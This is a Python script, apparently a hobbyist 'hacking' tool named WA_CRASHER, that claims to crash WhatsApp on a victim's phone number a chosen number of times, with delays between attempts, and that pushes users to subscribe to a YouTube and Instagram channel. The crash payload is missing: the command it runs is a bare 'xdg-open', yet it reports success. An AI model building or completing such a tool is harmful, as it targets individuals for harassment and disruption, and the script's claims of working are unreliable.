# Copyright (c) 2022 X PHANTOM (PH4N70M)

# Permission is hereby granted, free of charge, to any person obtaining a copy
#of this software and associated documentation files (the "Software"), to deal
#in the Software without restriction, including without limitation the rights
#to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
#copies of the Software, and to permit persons to whom the Software is
#furnished to do so, subject to the following conditions:
#
#The above copyright notice and this permission notice shall be included in all
#copies or substantial portions of the Software.
#
#THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
#IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
#FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
#AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
#LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
#OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
#SOFTWARE.
###################################
#  X PHANTOM (PH4N70M)            #
#Project : WA_CRASHER             #
#Type    : Whatsapp - Crasher     #
###################################
import os
import colorama
import time
import sys
from colorama import  Fore,Style
R = Fore.RED
B = Fore.BLUE
G = Fore.GREEN
C = Fore.CYAN
Y = Fore.YELLOW
M = Fore.MAGENTA
W = Fore.WHITE
try:
	import colorama
except ModuleNotFoundError:
	print("Requests is not Installed")
	os.system("pip install colorama")

logo = f"""
{C}                                                                                                      
 _       _____        __________  ___   _____ __  ____________ 
| |     / /   |      / ____/ __ \/   | / ___// / / / ____/ __ \
| | /| / / /| |     / /   / /_/ / /| | \__ \/ /_/ / __/ / /_/ /
| |/ |/ / ___ |    / /___/ _, _/ ___ |___/ / __  / /___/ _, _/ 
|__/|__/_/  |_|____\____/_/ |_/_/  |_/____/_/ /_/_____/_/ |_|  
             /_____/                                                                                                             
                                   
"""
os.system('clear')

def main():
	os.system('clear')
	print(logo)
	print()
	cncode=int(input(f'{G}[{W}+{G}]{W} Enter Country Code WithOut "+" eg.91 {G}=> '))
	print()
	num=input(f"{G}[{W}+{G}]{W} Enter the Victim's Phone number\n\n{G}=> {cncode}  ")
	print()
	crash=int(input(f'{G}[{W}+{G}]{W} Enter the number of crashes {W}(Max 45 per 30min) \n\n{G}=> '))
	combnum = f"+{cncode}{num}"
	print()
	Finalcall=input(f'{Y}[?]{W} Do You Want To Change NO.{W}{combnum} {R}(Y/N)\n\n{G}=> ')
	if Finalcall == 'Y'  or Finalcall == 'y':
		main()
	elif Finalcall == 'N' or Finalcall == 'n':
		os.system('clear')
		print(f"{G}[{W}+{G}]{W}Crashing Whatsapp on No. : +{cncode}{num} ...")
		time.sleep(5)
		link = (f"""xdg-open """)
	for i in range (crash):
		print()
		print(f"{Y}[✓] Sending Now\n")
		print(f"{G}[{W}+{G}]{W}Applying 40sec delay...")
		link1 = os.system(link)
		time.sleep(40)
		if link1 == 0:
			print(f"{G} Successful")
			pass
		else:
			print(f"{G}[×] Failed  ")
		time.sleep(0.2)
	return main()

def MSG():
	print(Y)
	YTC = input("Have You Subscribe Our Channel and Follow us on Insta? (Y/N): ")
	if YTC == 'Y' or YTC == 'y':
		print(G)
		print("Thank You For Supporting Us...\n")
		time.sleep(4)
		print("Initializing tool...")
		time.sleep(4)		
		print(W + "\n\n")
		main()
	elif YTC == 'N' or YTC == 'n':
		print("")
		os.system("xdg-open https://www.youtube.com/channel/UCXnBZRpLD7QzcJsUKBF-cKw")
		time.sleep(8)
		os.system("xdg-open https://www.instagram.com/hackers_colony_official")
		time.sleep(3)
		print(W + "\n\n")
		main()

MSG()
